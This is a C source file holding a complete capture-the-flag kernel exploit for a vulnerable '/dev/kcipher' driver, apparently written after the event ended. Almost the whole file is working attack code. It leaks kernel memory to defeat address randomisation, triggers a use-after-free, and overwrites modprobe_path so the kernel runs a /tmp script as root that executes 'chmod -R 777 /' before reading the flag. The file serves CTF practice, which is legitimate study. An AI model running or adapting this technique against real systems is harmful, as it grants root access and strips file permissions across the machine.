/*
 * This has been solved after the end of the CTF.
 */

#include <stdio.h>
#include <fcntl.h>
#include <unistd.h>
#include <stdint.h>
#include <sys/ioctl.h>
#include <string.h>
#include <stdlib.h>

#define IOCTL_REGISTER 0xedbeef00

unsigned long kernel_base = 0;
unsigned long modprobe_path = 0;

struct kcipher {
    uint32_t id;
    uint32_t key;
    uint64_t size;
    char *text;
    uint32_t spin_lock;
    char cipher_name[0x40];
};

// taken from https://github.com/google/google-ctf/blob/master/2023/pwn-kconcat/solution/exp.c
void hexdump(char* buf, int size) {
    for (int i = 0; i < size; i++) {
        if (i % 16 == 0)
            printf("%04x: ", i);
        printf("%02x ", buf[i]);
        if (i % 16 == 15)
            printf("\n");
    }
    if (size % 16 != 0)
        printf("\n");
}

void xor(char *dst, size_t len, char key)
{
    for (int i = 0; i < len; i++) {
        dst[i] ^= key;
    }
}

void get_flag(void) {
    system("echo -e '#!/bin/sh\nchmod -R 777 /' > /tmp/modprobe");
    system("chmod +x /tmp/modprobe");
    system("echo -e '\xde\xad\xbe\xef' > /tmp/pwn");
    system("chmod +x /tmp/pwn");
    system("/tmp/pwn");
    system("cat /root/flag.txt");
}

int main(void)
{
	int kcipher_fd, freed_fd, fd;
    char key = 0x42;

    fd = open("/dev/kcipher", O_RDWR);
    if (fd < 0) {
        perror("can't open device");
        return -1;
    }

    printf("[+] Spraying target reused object\n");

    // spray target freed object
    int spray[0x50];
    for (int i = 0; i < 50; i++) {
        spray[i] = open("/proc/self/stat", O_RDONLY | O_NOCTTY);
        if (spray[i] < 0) {
            perror("failed to spray");
            return -1;
        }
    }

    for (int i = 0; i < 50; i++) {
        close(spray[i]);
    }

    struct kcipher leak_kcipher;
    leak_kcipher.id = 1; // xor
    leak_kcipher.key = (uint32_t) key;

    char kcipher_header[8];
    memcpy(kcipher_header, &leak_kcipher, sizeof(kcipher_header));

    kcipher_fd = ioctl(fd, IOCTL_REGISTER, kcipher_header);
    if (kcipher_fd < 0) {
        perror("failed to register with ioctl");
        return -1;
    }

    // trigger target object reallocation with write() call
    // target reused object size = 0x20
    // kcipher->text = kmalloc(user_supplied_size); without zeroed

    char buf[0x20] = {0};
    write(kcipher_fd, buf, sizeof(buf));

    // dump encrypted kcipher->text
    read(kcipher_fd, buf, sizeof(buf));

    xor(buf, sizeof(buf), key);

    unsigned long leak = *(unsigned long *) (buf+8);

    printf("[.] leak: 0x%016lx\n", leak);

    kernel_base = leak - 0x15b870;
    modprobe_path = kernel_base + 0x8a83a0;
    printf("[+] kernel base address: 0x%016lx\n", kernel_base);

    // start code execution part
    struct kcipher invalid_kcipher = {
            .id = 0x41, // invalid if not in [0;3]
            .key = 0x41,
    };

    memcpy(kcipher_header, &invalid_kcipher, sizeof(kcipher_header));

    // trigger kfree(file->private_data)
    ioctl(fd, IOCTL_REGISTER, kcipher_header);

    freed_fd = kcipher_fd + 1;

    // overwriting modprobe_path "/sbin" to "/tmp/"
    // these are the iteration keys needed to go from "/sbin"[i] to "/tmp"[i]
    char keys[5] = {0, 0x7, 0xf, 0x19, 0x41};

    system("cat /proc/sys/kernel/modprobe");

    for (int i = 0; i < 5; i++) {
        struct kcipher fake_kcipher = {
                .id = 1,
                .key = keys[i],
                .spin_lock = 0,
                .size = 1,
                .text = (char*) (modprobe_path + i),
        };

        xor((char *) &fake_kcipher, sizeof(struct kcipher), key);

        // allocates a new text at freed_fd->private_data
        write(kcipher_fd, (char *) &fake_kcipher, sizeof(struct kcipher));

        struct kcipher fake_in_kernel;
        read(kcipher_fd, (char *) &fake_in_kernel, sizeof(struct kcipher));

        // trigger arb. write
        char b[0x60] = {0};
        read(freed_fd, b, sizeof(struct kcipher));
    }

    system("cat /proc/sys/kernel/modprobe");

    get_flag();

    return 0;
}
